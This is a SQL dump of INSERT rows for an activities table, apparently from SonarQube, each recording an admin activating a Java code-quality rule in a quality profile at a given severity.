INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3886, '2017-11-20 13:05:38.936', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMB4bbGRdfPp-raS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3887, '2017-11-20 13:05:38.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMCgbbGRdfPp-raT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3888, '2017-11-20 13:05:39.016', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMDIbbGRdfPp-raU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3889, '2017-11-20 13:05:39.057', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMDxbbGRdfPp-raV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3890, '2017-11-20 13:05:39.103', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMEfbbGRdfPp-raW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3891, '2017-11-20 13:05:39.14', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMFEbbGRdfPp-raX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3892, '2017-11-20 13:05:39.178', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMFqbbGRdfPp-raY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3893, '2017-11-20 13:05:39.243', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMGrbbGRdfPp-raZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3894, '2017-11-20 13:05:39.269', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMHFbbGRdfPp-raa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3895, '2017-11-20 13:05:39.309', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMHtbbGRdfPp-rab');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3896, '2017-11-20 13:05:39.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMIXbbGRdfPp-rac');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3897, '2017-11-20 13:05:39.395', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMJDbbGRdfPp-rad');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3898, '2017-11-20 13:05:39.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMJ4bbGRdfPp-rae');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3899, '2017-11-20 13:05:39.499', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMKrbbGRdfPp-raf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3900, '2017-11-20 13:05:39.574', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiML2bbGRdfPp-rag');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3901, '2017-11-20 13:05:39.616', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMMgbbGRdfPp-rah');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3902, '2017-11-20 13:05:39.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMNBbbGRdfPp-rai');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3903, '2017-11-20 13:05:39.679', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMNfbbGRdfPp-raj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3904, '2017-11-20 13:05:39.708', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMN8bbGRdfPp-rak');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3905, '2017-11-20 13:05:39.738', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMOabbGRdfPp-ral');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3906, '2017-11-20 13:05:39.772', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMO8bbGRdfPp-ram');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3907, '2017-11-20 13:05:39.806', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMPebbGRdfPp-ran');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3908, '2017-11-20 13:05:39.842', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMQCbbGRdfPp-rao');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3909, '2017-11-20 13:05:39.886', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMQubbGRdfPp-rap');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3910, '2017-11-20 13:05:39.918', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMRObbGRdfPp-raq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3911, '2017-11-20 13:05:39.963', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMR7bbGRdfPp-rar');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3912, '2017-11-20 13:05:39.995', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMSbbbGRdfPp-ras');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3913, '2017-11-20 13:05:40.022', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMS2bbGRdfPp-rat');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3914, '2017-11-20 13:05:40.042', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMTKbbGRdfPp-rau');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3915, '2017-11-20 13:05:40.068', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMTkbbGRdfPp-rav');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3916, '2017-11-20 13:05:40.086', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMT2bbGRdfPp-raw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3917, '2017-11-20 13:05:40.103', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMUHbbGRdfPp-rax');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3918, '2017-11-20 13:05:40.131', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMUjbbGRdfPp-ray');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3919, '2017-11-20 13:05:40.159', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMU_bbGRdfPp-raz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3920, '2017-11-20 13:05:40.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMVZbbGRdfPp-ra0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3921, '2017-11-20 13:05:40.215', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMV3bbGRdfPp-ra1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3922, '2017-11-20 13:05:40.232', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMWIbbGRdfPp-ra2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3923, '2017-11-20 13:05:40.261', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMWlbbGRdfPp-ra3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3924, '2017-11-20 13:05:40.289', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMXBbbGRdfPp-ra4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3925, '2017-11-20 13:05:40.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMXnbbGRdfPp-ra5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3926, '2017-11-20 13:05:40.364', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMYMbbGRdfPp-ra6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3927, '2017-11-20 13:05:40.423', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMZHbbGRdfPp-ra7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3928, '2017-11-20 13:05:40.509', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMadbbGRdfPp-ra8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3929, '2017-11-20 13:05:40.632', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMcXbbGRdfPp-ra9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3930, '2017-11-20 13:05:40.707', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMdjbbGRdfPp-ra-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3931, '2017-11-20 13:05:40.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMfxbbGRdfPp-ra_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3932, '2017-11-20 13:05:40.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMgObbGRdfPp-rbA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3933, '2017-11-20 13:05:40.91', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMgtbbGRdfPp-rbB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3934, '2017-11-20 13:05:40.937', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMhJbbGRdfPp-rbC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3935, '2017-11-20 13:05:40.961', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMhhbbGRdfPp-rbD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3936, '2017-11-20 13:05:40.986', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMh6bbGRdfPp-rbE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3937, '2017-11-20 13:05:41.01', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMiSbbGRdfPp-rbF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3938, '2017-11-20 13:05:41.034', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMiqbbGRdfPp-rbG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3939, '2017-11-20 13:05:41.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMjPbbGRdfPp-rbH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3940, '2017-11-20 13:05:41.097', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMjpbbGRdfPp-rbI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3941, '2017-11-20 13:05:41.116', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMj8bbGRdfPp-rbJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3942, '2017-11-20 13:05:41.138', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMkSbbGRdfPp-rbK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3943, '2017-11-20 13:05:41.162', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMkqbbGRdfPp-rbL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3944, '2017-11-20 13:05:41.187', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMlDbbGRdfPp-rbM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3945, '2017-11-20 13:05:41.212', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMlcbbGRdfPp-rbN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3946, '2017-11-20 13:05:41.236', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMl0bbGRdfPp-rbO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3947, '2017-11-20 13:05:41.254', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMmGbbGRdfPp-rbP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3948, '2017-11-20 13:05:41.278', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMmebbGRdfPp-rbQ');
